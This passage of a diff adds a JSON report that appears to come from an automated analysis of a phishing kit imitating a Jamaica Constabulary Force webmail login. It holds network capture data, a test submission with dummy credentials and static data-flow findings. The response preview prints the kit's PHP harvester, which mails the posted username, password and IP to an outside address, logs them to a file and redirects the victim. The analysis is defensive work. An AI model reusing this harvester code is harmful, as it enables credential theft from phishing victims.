+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Content-Length",
+        "Content-Type",
+        "Host",
+        "Pragma",
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "401",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Wed, 06 May 2026 01:04:13 GMT",
+        "Keep-Alive": "timeout=5, max=77",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+      "responseBodyLength": 628,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 652,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 275079.534712,
+      "lastEventTs": 1778029454293,
+      "requestSentTs": 275079.534712,
+      "responseReceivedTs": 275079.538073,
+      "loadingFinishedTs": 275079.537253,
+      "latencyMs": 2.5,
+      "ttfbMs": 3.4,
+      "_timing_summary": {
+        "latencyMs": 2.5,
+        "ttfbMs": 3.4,
+        "protocol": "http/1.1",
+        "redirected": false,
+        "redirectChain": [],
+        "status": 200,
+        "hasCookieHeader": false,
+        "hasSetCookie": false
+      }
+    }
+  ],
+  "cdp_monitoring": {
+    "enabled": true,
+    "degraded": false,
+    "note": "ok"
+  },
+  "static_analysis": {
+    "function_count": 1,
+    "php_file_count": 1,
+    "data_flow_count": 1,
+    "data_flows": [
+      {
+        "form_source": "newrack/New Rack/index.html",
+        "form_method": "post",
+        "form_fields": [
+          "__RequestVerificationToken",
+          "destination",
+          "flags",
+          "username",
+          "password"
+        ],
+        "action_target": "new.php",
+        "server_file": "newrack/New Rack/new.php",
+        "server_receives": [
+          "password",
+          "username"
+        ],
+        "server_actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 14
+          },
+          {
+            "type": "redirect",
+            "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+            "line": 18
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      }
+    ],
+    "php_files": {
+      "newrack/New Rack/new.php": {
+        "receives_post": [
+          "password",
+          "username"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 14
+          },
+          {
+            "type": "redirect",
+            "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+            "line": 18
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      }
+    }
+  }
+}
